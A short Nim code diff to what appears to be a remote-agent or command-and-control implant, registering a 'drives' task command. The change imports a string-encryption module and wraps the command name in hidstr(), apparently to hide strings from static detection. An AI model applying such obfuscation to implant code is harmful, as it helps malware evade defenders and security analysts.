@@ -1,6 +1,7 @@
 import std/[os, json, osproc, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc drivesExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
@@ -36,4 +37,4 @@ proc drivesExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initDrives*() =
-  register("drives", drivesExecute)
+  register(hidstr("drives"), drivesExecute)
